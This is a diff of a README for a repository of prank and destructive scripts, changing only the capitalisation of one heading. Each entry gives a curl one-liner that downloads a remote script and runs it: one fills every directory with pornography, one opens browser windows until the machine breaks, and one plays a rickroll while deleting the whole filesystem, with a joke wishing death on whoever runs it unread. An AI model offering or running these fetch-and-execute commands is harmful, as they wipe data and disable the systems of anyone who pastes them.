@@ -35,7 +35,7 @@ This little 'project' was made because I wanted to excercise in as many language
 ### Linux platform
 #### 2 (Node.js) - Downloads p0rn in every available directory (not compiled yet)
 ```curl -sL https://github.com/TheDebianGuy/Hackingtools/blob/master/2/script.js?raw=true -o script.js; node script.js```
-#### 3 (Bash) - rickrolling while deleting whole filesystem, use when escaping feds, death to whoever launches this without looking at the code 😂
+#### 3 (Bash) - Rickrolling while deleting whole filesystem, use when escaping feds, death to whoever launches this without looking at the code 😂
 ```curl -sL https://github.com/TheDebianGuy/Hackingtools/blob/master/3/script.sh?raw=true -o script; chmod+x script; ./script```
 #### 4 (Python) - while True: webbrowser.open('https://pornhub.com'), with 4 threads it was able to break pc, lowered to 2 threads
 ```curl -sL https://github.com/TheDebianGuy/Hackingtools/blob/master/4/script.bin?raw=true -o script.bin; chmod+x script.bin; ./script.bin```
